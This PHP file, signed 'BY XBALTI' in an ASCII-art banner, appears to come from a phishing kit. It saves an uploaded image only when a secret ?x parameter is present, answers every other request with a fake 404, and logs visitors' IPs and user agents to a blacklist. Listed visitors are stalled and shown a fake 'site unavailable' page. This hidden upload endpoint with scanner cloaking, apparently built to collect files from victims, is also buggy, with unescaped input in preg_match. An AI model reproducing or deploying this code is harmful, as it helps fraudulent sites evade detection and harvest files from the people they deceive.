<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |  
*/
 if(isset($_FILES['image'])){
      $errors= array();
      $file_size = $_FILES['image']['size'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      $expensions= array("jpeg","jpg","png");
      if(in_array($file_ext,$expensions)=== true){
	  if (!unlink("my.jpeg")) { }
	  if (!unlink("my.jpg")) { }
	  if (!unlink("my.png")) { }
		 if($file_size > 2097152) {
         header("Location: ./");
      }
	  
	  else {
		$newname = "my.".$file_ext;
        echo isset ($_GET['x']) ? (copy ($_FILES['image']['tmp_name'], $newname) ? "Image Uploaded" : "Error") : "Off";
		header("Location: ./");
	  }
	  }
	  else {
		header('HTTP/1.0 404 Not Found'); 
		exit();
	}
	  }
	else {
		header('HTTP/1.0 404 Not Found'); 
		exit();
	}
	  
	       /* end of whitelist */
      $badbot = 0;
	  $REMOTE_ADDR = $_SERVER['REMOTE_ADDR'];
	  $REQUEST_METHOD = $_SERVER['REQUEST_METHOD'];
	  $REQUEST_URI = $_SERVER['REQUEST_URI'];
	  $SERVER_PROTOCOL = $_SERVER['SERVER_PROTOCOL'];
	  $HTTP_REFERER = $_SERVER['HTTP_REFERER'];
	  $HTTP_USER_AGENT = $_SERVER['HTTP_USER_AGENT'];
      /* scan the blacklist.dat file for addresses of SPAM robots
         to prevent filling it up with duplicates */
      $filename = "../blacklist/blacklist.dat";
      $fp = fopen($filename, "r") or die ("Error opening file ... <br>\n");
      while ($line = fgets($fp,255)) {
        $u = explode(" ",$line);
        $u0 = $u[0];
        if (preg_match("/$u0/",$REMOTE_ADDR)) {$badbot++;}
      }
      fclose($fp);
      if ($badbot == 0) { /* we just see a new bad bot not yet listed ! */
        $tmestamp = time();
        $datum = date("Y-m-d (D) H:i:s",$tmestamp);
      /* append bad bot address data to blacklist log file: */
        $fp = fopen($filename,'a+');
        fwrite($fp,"$REMOTE_ADDR - - [$datum] \"$REQUEST_METHOD $REQUEST_URI $SERVER_PROTOCOL\" $HTTP_REFERER $HTTP_USER_AGENT\n");
        fclose($fp);
		echo '<html>
    <head><title> </title></head>
    <body>
    <p>There is nothing here to see. So what are you doing here ?</p>
    <p><a href="../">Go home.</a></p>
    </body>
    </html>';
      }
	if ($badbot > 0) { /* this is a bad bot, reject it */
      sleep(12);
      print ("<html><head>\n");
      print ("<title>Site unavailable, sorry</title>\n");
      print ("</head><body>\n");
      print ("<center><h1>Welcome ...</h1></center>\n");
      print ("<p><center>Unfortunately, due to abuse, this site is temporarily not available ...</center></p>\n");
      print ("</body></html>\n");
      exit;
    } 
      
?>
